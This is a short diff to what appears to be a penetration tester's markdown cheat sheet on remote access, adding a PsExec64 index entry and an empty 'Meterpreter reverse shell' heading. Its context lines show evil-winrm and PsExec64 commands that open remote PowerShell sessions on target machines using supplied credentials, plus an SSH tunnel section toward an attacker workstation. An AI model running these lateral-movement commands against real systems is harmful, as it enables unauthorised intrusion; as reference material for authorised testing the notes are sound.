@@ -4,6 +4,7 @@ Index
 - [SSH Tunneling](#SSH-Tunneling)
 - [Windows New-PSSession](#Windows-New-PSSession)
 - [Evil-winrm](#Evil-winrm)
+- [PsExec64](#PsExec64)
 
 ## SSH Tunneling
 Fron INTERNAL target to ATTACKER workstation:
@@ -33,3 +34,5 @@ evil-winrm -i 192.168.163.249 -u 'username' -p 'password'
 ./PsExec64.exe -i \\TARGET -u $DIMAIN\$USER -p "$PASSWORD" powershell
 ./PsExec64.exe -i \\192.168.1.1 -u TEST\username -p "password" powershell
 ```
+
+## Meterpreter reverse shell (1)
